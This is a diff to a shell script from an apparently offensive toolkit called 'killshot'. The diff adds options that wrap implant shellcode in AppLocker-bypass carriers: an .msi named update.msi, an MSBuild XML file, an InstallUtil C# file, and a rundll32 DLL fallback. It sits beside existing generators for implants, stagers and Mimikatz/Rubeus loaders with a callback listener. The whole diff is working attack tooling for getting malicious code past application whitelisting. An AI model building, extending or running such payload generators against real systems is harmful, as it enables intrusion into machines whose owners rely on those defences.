@@ -45,6 +45,9 @@ show_help() {
     echo "    --tool <name>          Single tool to shellcode (see killshot list)"
     echo "    --tools                All offensive tools to shellcode"
     echo "    --loaders              PowerShell tool loaders (Rubeus/Mimikatz fallback)"
+    echo "    --msi                  MSI AppLocker bypass (wraps implant in .msi)"
+    echo "    --msbuild              MSBuild XML AppLocker bypass"
+    echo "    --installutil          InstallUtil C# AppLocker bypass"
     echo ""
     echo "  GENERATE OPTIONS"
     echo "    -l, --lhost IP         Listener/callback IP         (default: 10.99.0.16)"
@@ -213,6 +216,9 @@ GEN_STAGER=0
 GEN_POTATOES=0
 GEN_TOOLS=0
 GEN_LOADERS=0
+GEN_MSI=0
+GEN_MSBUILD=0
+GEN_INSTALLUTIL=0
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -225,6 +231,9 @@ while [[ $# -gt 0 ]]; do
         --tools)        GEN_TOOLS=1; shift;;
         --tool)         GEN_TOOLS=1; SINGLE_TOOL="$2"; shift 2;;
         --loaders)      GEN_LOADERS=1; shift;;
+        --msi)          GEN_MSI=1; shift;;
+        --msbuild)      GEN_MSBUILD=1; shift;;
+        --installutil)  GEN_INSTALLUTIL=1; shift;;
         -l|--lhost)     LHOST="$2"; shift 2;;
         -p|--lport)     LPORT="$2"; shift 2;;
         -h|--http)      HTTP_PORT="$2"; shift 2;;
@@ -250,10 +259,11 @@ done
 if [ "$GEN_ALL" = "1" ]; then
     GEN_IMPLANT=1; GEN_RUNNER=1; GEN_STAGER=1
     GEN_POTATOES=1; GEN_TOOLS=1; GEN_LOADERS=1
+    GEN_MSI=1; GEN_MSBUILD=1; GEN_INSTALLUTIL=1
 fi
 
 # If no component flags given, show help
-if [ "$GEN_IMPLANT$GEN_RUNNER$GEN_STAGER$GEN_POTATOES$GEN_TOOLS$GEN_LOADERS" = "000000" ]; then
+if [ "$GEN_IMPLANT$GEN_RUNNER$GEN_STAGER$GEN_POTATOES$GEN_TOOLS$GEN_LOADERS$GEN_MSI$GEN_MSBUILD$GEN_INSTALLUTIL" = "000000000" ]; then
     echo "[!] No component flags specified. Use --all for everything, or pick components:"
     echo ""
     echo "    killshot generate -l $LHOST --all         # Everything"
@@ -589,6 +599,95 @@ print(f'[+] Donut shellcode: {len(sc)} bytes')
                 break
             fi
         done
+    fi
+fi
+
+# ─── AppLocker Bypass: MSI ──────────────────────────────────
+
+if [ "$GEN_MSI" = "1" ]; then
+    echo ""
+    echo "[*] Generating MSI AppLocker bypass..."
+
+    # Need implant shellcode — generate if not already present
+    IMPLANT_BIN=""
+    if [ -f "/tmp/implant.bin" ]; then
+        IMPLANT_BIN="/tmp/implant.bin"
+    elif [ -f "$WORKSPACE/implant.enc" ]; then
+        # Decode the base64 .enc back to raw shellcode
+        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_msi.bin
+        IMPLANT_BIN="/tmp/implant_msi.bin"
+    fi
+
+    if [ -n "$IMPLANT_BIN" ]; then
+        cd "$SCRIPT_DIR"
+        python3 gen_msi.py \
+            -i "$IMPLANT_BIN" \
+            -o "$WORKSPACE/update.msi" 2>&1 | grep -E "^\[" || true
+        if [ -f "$WORKSPACE/update.msi" ]; then
+            GENERATED+=("update.msi")
+        elif [ -f "$WORKSPACE/update.dll" ]; then
+            # wixl unavailable — DLL fallback for rundll32/trusted path bypass
+            GENERATED+=("update.dll")
+        fi
+        rm -f /tmp/implant_msi.bin
+    else
+        echo "[!] MSI requires implant shellcode — run with --implant or provide /tmp/implant.bin"
+    fi
+fi
+
+# ─── AppLocker Bypass: MSBuild ─────────────────────────────
+
+if [ "$GEN_MSBUILD" = "1" ]; then
+    echo ""
+    echo "[*] Generating MSBuild AppLocker bypass..."
+
+    IMPLANT_BIN=""
+    if [ -f "/tmp/implant.bin" ]; then
+        IMPLANT_BIN="/tmp/implant.bin"
+    elif [ -f "$WORKSPACE/implant.enc" ]; then
+        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_msb.bin
+        IMPLANT_BIN="/tmp/implant_msb.bin"
+    fi
+
+    if [ -n "$IMPLANT_BIN" ]; then
+        cd "$SCRIPT_DIR"
+        python3 gen_applocker.py --msbuild \
+            -i "$IMPLANT_BIN" \
+            -o "$WORKSPACE/build.xml" 2>&1 | grep -E "^\[" || true
+        if [ -f "$WORKSPACE/build.xml" ]; then
+            GENERATED+=("build.xml")
+        fi
+        rm -f /tmp/implant_msb.bin
+    else
+        echo "[!] MSBuild requires implant shellcode — run with --implant or provide /tmp/implant.bin"
+    fi
+fi
+
+# ─── AppLocker Bypass: InstallUtil ─────────────────────────
+
+if [ "$GEN_INSTALLUTIL" = "1" ]; then
+    echo ""
+    echo "[*] Generating InstallUtil AppLocker bypass..."
+
+    IMPLANT_BIN=""
+    if [ -f "/tmp/implant.bin" ]; then
+        IMPLANT_BIN="/tmp/implant.bin"
+    elif [ -f "$WORKSPACE/implant.enc" ]; then
+        base64 -d "$WORKSPACE/implant.enc" > /tmp/implant_iu.bin
+        IMPLANT_BIN="/tmp/implant_iu.bin"
+    fi
+
+    if [ -n "$IMPLANT_BIN" ]; then
+        cd "$SCRIPT_DIR"
+        python3 gen_applocker.py --installutil \
+            -i "$IMPLANT_BIN" \
+            -o "$WORKSPACE/service.cs" 2>&1 | grep -E "^\[" || true
+        if [ -f "$WORKSPACE/service.cs" ]; then
+            GENERATED+=("service.cs")
+        fi
+        rm -f /tmp/implant_iu.bin
+    else
+        echo "[!] InstallUtil requires implant shellcode — run with --implant or provide /tmp/implant.bin"
     fi
 fi
 
